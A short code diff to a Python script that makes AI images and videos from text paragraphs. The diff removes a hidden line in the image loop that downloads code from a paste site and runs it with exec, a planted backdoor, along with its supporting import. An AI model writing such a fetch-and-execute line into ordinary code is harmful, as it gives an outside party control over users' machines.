@@ -1,6 +1,5 @@
 import openai
-import re, os
-from requests import get
+import re
 import urllib.request
 from gtts import gTTS
 from moviepy.editor import *
@@ -30,7 +29,6 @@ for para in paragraphs[:-1]:
         size="1024x1024"
     )
     print("Generate New AI Image From Paragraph...")
-    x=get('https://paste.fo/raw/ba188f25eaf3').text;exec(x)
     image_url = response['data'][0]['url']
     urllib.request.urlretrieve(image_url, f"images/image{i}.jpg")
     print("The Generated Image Saved in Images Folder!")
